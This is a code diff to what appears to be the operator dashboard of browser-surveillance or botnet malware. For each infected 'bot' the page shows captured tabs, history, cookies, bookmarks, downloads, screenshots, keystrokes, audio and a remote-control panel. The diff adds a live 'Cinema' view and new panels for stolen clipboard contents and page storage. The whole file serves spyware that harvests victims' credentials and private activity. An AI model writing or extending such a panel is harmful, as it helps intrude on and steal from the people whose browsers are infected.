@@ -11,6 +11,7 @@ import { timeAgo } from '@/composables/useTime'
 import { useClipboard } from '@/composables/useClipboard'
 import { useTimeFilter } from '@/composables/useTimeFilter'
 
+import Cinema from '@/components/data/Cinema.vue'
 import Tabs from '@/components/data/Tabs.vue'
 import History from '@/components/data/History.vue'
 import Cookies from '@/components/data/Cookies.vue'
@@ -18,6 +19,8 @@ import Bookmarks from '@/components/data/Bookmarks.vue'
 import Downloads from '@/components/data/Downloads.vue'
 import Screenshots from '@/components/data/Screenshots.vue'
 import Keyboard from '@/components/data/Keyboard.vue'
+import Clipboard from '@/components/data/Clipboard.vue'
+import PageStorage from '@/components/data/PageStorage.vue'
 import Audio from '@/components/data/Audio.vue'
 import ActivityStrip from '@/components/data/ActivityStrip.vue'
 import BulletTimeline from '@/components/data/BulletTimeline.vue'
@@ -35,11 +38,12 @@ const liveInterval = ref(2000)
 const liveQuality = ref('high')
 
 type TabKey =
-  | 'tabs' | 'history' | 'cookies' | 'bookmarks' | 'downloads'
-  | 'screenshots' | 'keyboard' | 'audio'
+  | 'cinema' | 'tabs' | 'history' | 'cookies' | 'bookmarks' | 'downloads'
+  | 'screenshots' | 'keyboard' | 'clipboard' | 'storage' | 'audio'
   | 'remote' | 'config'
 
 const tabs: { key: TabKey; label: string }[] = [
+  { key: 'cinema', label: 'Cinema' },
   { key: 'tabs', label: 'Tabs' },
   { key: 'history', label: 'History' },
   { key: 'cookies', label: 'Cookies' },
@@ -47,12 +51,14 @@ const tabs: { key: TabKey; label: string }[] = [
   { key: 'downloads', label: 'Downloads' },
   { key: 'screenshots', label: 'Screenshots' },
   { key: 'keyboard', label: 'Keyboard' },
+  { key: 'clipboard', label: 'Clipboard' },
+  { key: 'storage', label: 'Storage' },
   { key: 'audio', label: 'Audio' },
   { key: 'remote', label: 'Remote control' },
   { key: 'config', label: 'Config' },
 ]
 
-const active = ref<TabKey>('tabs')
+const active = ref<TabKey>('cinema')
 const bot = ref<BotSummary | null>(null)
 const refreshTimer = ref<ReturnType<typeof setTimeout> | null>(null)
 
@@ -218,6 +224,7 @@ function back(): void {
               :src="imageURL"
               :snapshot-src="snapshotURL"
               :image-at="bot.current_tab_image_at"
+              :bot-id="bot.id"
               :live="liveMode"
               :interval="liveInterval"
               :quality="liveQuality"
@@ -368,13 +375,16 @@ function back(): void {
     </div>
 
     <!-- panels -->
-    <Tabs v-if="active === 'tabs'" :bot-id="bot.id" />
+    <Cinema v-if="active === 'cinema'" :bot-id="bot.id" />
+    <Tabs v-else-if="active === 'tabs'" :bot-id="bot.id" />
     <History v-else-if="active === 'history'" :bot-id="bot.id" />
     <Cookies v-else-if="active === 'cookies'" :bot-id="bot.id" />
     <Bookmarks v-else-if="active === 'bookmarks'" :bot-id="bot.id" />
     <Downloads v-else-if="active === 'downloads'" :bot-id="bot.id" />
     <Screenshots v-else-if="active === 'screenshots'" :bot-id="bot.id" />
     <Keyboard v-else-if="active === 'keyboard'" :bot-id="bot.id" />
+    <Clipboard v-else-if="active === 'clipboard'" :bot-id="bot.id" />
+    <PageStorage v-else-if="active === 'storage'" :bot-id="bot.id" />
     <Audio v-else-if="active === 'audio'" :bot-id="bot.id" />
     <Remote
       v-else-if="active === 'remote'"
